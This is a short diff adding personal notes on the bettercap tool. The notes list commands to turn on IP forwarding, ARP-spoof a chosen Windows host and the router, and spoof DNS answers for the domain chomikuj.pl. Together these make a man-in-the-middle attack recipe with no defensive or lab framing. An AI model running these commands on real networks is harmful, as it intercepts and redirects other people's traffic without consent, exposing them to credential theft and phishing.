@@ -1,0 +1,14 @@
+bettercap:
+
+IP FORWARDING:	echo 1 > /proc/sys/net/ipv4/ip_forward
+
+sudo bettercap
+
+	arp.spoof			spoofing selected hosts on the network
+	set arp.spoof.fullduplex	true (host & router) or false (default - only host)
+	set arp.spoof.targets		<windows IP>
+	arp.spoof on / off	
+	
+	dns.spoof			spoof dns responses - together with arp.spoof
+	set dns.spoof.domains		chomikuj.pl
+	dns.spoof on /off
